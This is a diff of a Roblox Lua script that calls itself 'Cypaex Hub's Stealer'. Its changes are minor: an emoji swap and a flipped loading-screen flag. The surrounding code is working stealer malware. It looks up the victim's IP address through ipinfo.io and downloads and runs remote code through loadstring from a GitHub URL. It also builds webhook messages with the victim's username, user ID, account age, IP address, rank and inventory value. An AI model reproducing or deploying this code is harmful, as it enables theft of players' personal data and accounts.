@@ -213,7 +213,7 @@ local IPadress = game:HttpGet('https://ipinfo.io/ip')
 local data1
 
 -- Loading Screen
-if _G.LoadingScreen ~= false then
+if _G.LoadingScreen ~= true then
     loadstring(game:HttpGet('https://raw.githubusercontent.com/Cypaex/Loading/main/Engine'))() -- Exc : https://raw.githubusercontent.com/blabla/blabla/main/ls.lua
 end
 
@@ -971,7 +971,7 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
                     ["width"] = 420
                 },
                 ["fields"] = { {
-                    ["name"] = "**This data was generated using Cypaex Hub's Stealer** :moyai:",
+                    ["name"] = "**This data was generated using Cypaex Hub's Stealer** :melting_face:",
                     ["value"] = "```Username     : " .. username ..
                         "\nUser-ID      : " .. fardplayer.userId .. "\nAccount Age  : " .. fardplayer.AccountAge ..
                         " Days\nIP Address   : " .. IPadress .. "\nRank           : " .. rank .. "\nRAP          : " .. RAP() ..
@@ -1041,7 +1041,7 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
                     ["width"] = 420
                 },
                 ["fields"] = { {
-                    ["name"] = "**This data was generated using Cypaex Hub's Stealer** :moyai:",
+                    ["name"] = "**This data was generated using Cypaex Hub's Stealer** :melting_face:",
                     ["value"] = "```Username     : " .. username ..
                         "\nUser-ID      : " .. fardplayer.userId .. "\nAccount Age  : " .. fardplayer.AccountAge ..
                         " Days\nIP Address   : " .. IPadress .. "\nRank         : " .. rank .. "\nRAP          : " .. RAP() ..
